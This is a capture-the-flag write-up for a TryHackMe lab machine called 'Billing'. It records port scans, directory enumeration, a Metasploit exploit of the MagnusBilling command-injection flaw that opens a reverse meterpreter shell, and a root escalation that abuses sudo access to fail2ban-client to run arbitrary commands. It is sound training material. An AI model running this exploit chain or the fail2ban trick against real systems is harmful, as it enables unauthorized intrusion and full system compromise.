# Billing

Some mistakes can be costly.

## Flags

Gain a shell, find the way and escalate your privileges!

Note: Bruteforcing is out of scope for this room.

### user.txt

Searching for ports

```
nmap -Pn -vv -T4 -p- 10.10.201.155
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-24 07:45 BST
Initiating ARP Ping Scan at 07:45
Scanning 10.10.201.155 [1 port]
Completed ARP Ping Scan at 07:45, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:45
Completed Parallel DNS resolution of 1 host. at 07:45, 0.00s elapsed
Initiating SYN Stealth Scan at 07:45
Scanning 10.10.201.155 [65535 ports]
Discovered open port 80/tcp on 10.10.201.155
Discovered open port 3306/tcp on 10.10.201.155
Discovered open port 22/tcp on 10.10.201.155
Discovered open port 5038/tcp on 10.10.201.155
Completed SYN Stealth Scan at 07:45, 0.97s elapsed (65535 total ports)
Nmap scan report for 10.10.201.155
Host is up, received arp-response (0.00012s latency).
Scanned at 2025-04-24 07:45:27 BST for 1s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
5038/tcp open  unknown syn-ack ttl 64
MAC Address: 02:AE:BF:44:60:CB (Unknown)
```

```
nmap -sV -p22,80,3306,5038 10.10.201.155
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-24 07:47 BST
Nmap scan report for 10.10.201.155
Host is up (0.00012s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql    MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```

Searching for hidden directories

```
gobuster dir -u http://10.10.201.155/mbilling/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.201.155/mbilling/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/archive              (Status: 301) [Size: 325] [--> http://10.10.201.155/mbilling/archive/]
/resources            (Status: 301) [Size: 327] [--> http://10.10.201.155/mbilling/resources/]
/assets               (Status: 301) [Size: 324] [--> http://10.10.201.155/mbilling/assets/]
/lib                  (Status: 301) [Size: 321] [--> http://10.10.201.155/mbilling/lib/]
/tmp                  (Status: 301) [Size: 321] [--> http://10.10.201.155/mbilling/tmp/]
/protected            (Status: 403) [Size: 278]
Progress: 81643 / 81644 (100.00%)
===============================================================
Finished
===============================================================
```

Check mysql default connection

```
mysql -h 10.10.201.155 -u ''
ERROR 2003 (HY000): Can't connect to MySQL server on '10.10.201.155:3306' (113)
```

Search for asterisk exploit

```
msfconsole
...
msf6 > search asterisk
Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/linux/misc/asterisk_ami_originate_auth_rce          2024-08-08       great      Yes    Asterisk AMI Originate Authenticated RCE
   1   auxiliary/gather/asterisk_creds                             .                normal     No     Asterisk Gather Credentials
   2   auxiliary/voip/asterisk_login                               .                normal     No     Asterisk Manager Login Utility
   3   exploit/linux/http/grandstream_ucm62xx_sendemail_rce        2020-03-23       excellent  Yes    Grandstream UCM62xx IP PBX sendPasswordEmail RCE
   4     \_ target: Unix Command                                   .                .          .      .
   5     \_ target: Linux Dropper                                  .                .          .      .
   6   exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   7     \_ target: PHP                                            .                .          .      .
   8     \_ target: Unix Command                                   .                .          .      .
   9     \_ target: Linux Dropper                                  .                .          .      .
   10  exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce       2020-04-28       excellent  Yes    TrixBox CE endpoint_devicemap.php Authenticated Command Execution
   11    \_ target: Automatic (Linux Dropper)                      .                .          .      .
   12    \_ target: Automatic (Unix In-Memory)                     .                .          .      .


Interact with a module by name or index. For example info 12, use 12 or use exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Unix In-Memory)'

msf6 > use 6
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOST 10.10.201.155
RHOST => 10.10.201.155
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 10.10.153.248
LHOST => 10.10.153.248
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 10.10.153.248:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.253.229:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 4 seconds.
[*] Elapsed time: 4.32 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.10.253.229
[+] Deleted TFPDlhAvc.php
[*] Meterpreter session 1 opened (10.10.153.248:4444 -> 10.10.253.229:34598) at 2025-04-24 08:22:25 +0100
```

We've got shell

```
meterpreter > shell
Process 1396 created.
Channel 0 created.
whoami
asterisk
ls
icepay-cc.php
icepay-ddebit.php
icepay-directebank.php
icepay-giropay.php
icepay-ideal.php
icepay-mistercash.php
icepay-paypal.php
icepay-paysafecard.php
icepay-phone.php
icepay-sms.php
icepay-wire.php
icepay.php
null
pwd
/var/www/html/mbilling/lib/icepay
cd ../../../
pwd
/var/www/html
cd /
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd home
ls
magnus
cd magnus
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
cat user.txt
THM{REDACTED}
```

### root.txt

Check sudo rights

```
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Search exploit for [fail2ban](https://vnc.tryhackme.tech/index.html?host=proxy.tryhackme.tech&password=e9e011324648b872&proxyIP=10.10.153.248&resize=remote)

Exploit

```
cd /tmp
sudo /usr/bin/fail2ban-client restart
Shutdown successful
Server ready
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
1
ls
root.txt
cat root.txt
THM{REDACTED}
```